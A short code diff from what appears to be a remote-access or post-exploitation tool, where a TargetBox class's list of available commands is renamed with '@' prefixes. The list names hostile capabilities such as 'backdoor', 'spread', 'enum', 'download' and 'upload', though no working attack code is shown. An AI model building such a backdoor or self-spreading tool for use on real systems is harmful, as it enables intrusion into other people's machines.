@@ -31,7 +31,7 @@ class TargetBox(object):
         except URLError:
             self.local_ip = 'Unknown'
 
-        self.available_commands = "['backdoor', 'banner', 'clear', 'download', 'enum', 'exit', 'history', 'info', 'spread', 'update', 'upload']"
+        self.available_commands = "['@backdoor', '@banner', '@download', '@enum', '@history', '@info', '@spread', '@update', '@upload', 'clear', 'exit']"
 
     def get_information(self):
         self.info = \
